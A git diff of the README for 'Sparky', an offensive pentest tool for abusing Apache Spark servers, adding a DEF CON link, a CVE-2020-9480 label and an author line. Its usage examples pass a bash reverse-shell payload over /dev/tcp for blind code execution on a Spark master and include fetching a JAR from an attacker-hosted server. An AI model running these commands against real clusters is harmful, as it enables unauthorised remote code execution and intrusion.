@@ -1,6 +1,7 @@
 # Sparky
 
-Sparky is a tool to easily abuse and pentest a Spark server in Standalone mode. (Some features work on a Yarn cluster as well)
+Sparky is a tool to easily abuse and pentest a Spark server in Standalone mode. (Some features work on a Yarn cluster as well).  
+The tool was introduced in [DEF CON Safemode 2020](https://www.youtube.com/watch?v=EAzdGo-i8vE)
 
 ## Features
 
@@ -184,8 +185,10 @@ hadoop
 ### Blind code execution 4
 Executing a JAR file using REST API on port 6066
 Spark master is listening at 192.168.1.30:7077. Your computer is 192.168.1.22
+Put res/simpleApp.jar on a webserver you control
+
 ```sh
-python sparky.py 192.168.1.30 192.168.1.22 -c "bash -i >& /dev/tcp/192.168.1.22/443 0>&1" -w https://www.domain.com/file.jar
+python sparky.py 192.168.1.30 192.168.1.22 -c "bash -i >& /dev/tcp/192.168.1.22/443 0>&1" -w https://www.domain.com/simpleApp.jar
 
 [*] Testing target to confirm a spark master is running on 192.168.1.30:7077
 [+] Spark master confirmed at 192.168.1.30:7077
@@ -193,7 +196,7 @@ python sparky.py 192.168.1.30 192.168.1.22 -c "bash -i >& /dev/tcp/192.168.1.22/
 ```
 Omitting the JAR URL works as well, but uses a different trigger to execute code. See OnOutofMemory below
 
-### Blind code execution 5 - Authentication bypass
+### Blind code execution 5 - Authentication bypass CVE-2020-9480
 Blind code execution using OnOutOfMemory parameter to trigger code execution. Need to adjust the "-m" parameter which refers to maximum heap memory allocated by JVM.
 Spark master is listening at 192.168.1.30:7077. Your computer is 192.168.1.22
 ```sh
@@ -209,3 +212,6 @@ python sparky.py 192.168.1.30 192.168.1.22 -c "bash -i >& /dev/tcp/192.168.1.22/
 
 ## Licence
 Sparky is licenced under GPLv3
+
+## Author
+@ayoul3
